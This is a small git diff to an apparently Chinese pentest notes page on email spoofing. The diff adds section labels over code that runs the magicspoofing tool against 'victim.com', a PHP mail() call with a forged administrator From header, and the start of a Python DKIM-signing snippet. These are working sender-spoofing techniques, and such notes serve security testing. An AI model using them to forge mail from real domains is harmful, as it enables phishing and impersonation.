@@ -167,6 +167,7 @@ print("[***]Successfully Sent Email to %s:" % (msg['To']))
 
 5.欺骗邮件
 
+工具
 ```bash
 https://github.com/magichk/magicspoofing
 
@@ -174,10 +175,12 @@ python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
 python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
 ```
 
+PHP
 ```php
 mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
 ```
 
+Python
 ```python
 import os
 import dkim #pip3 install dkimpy
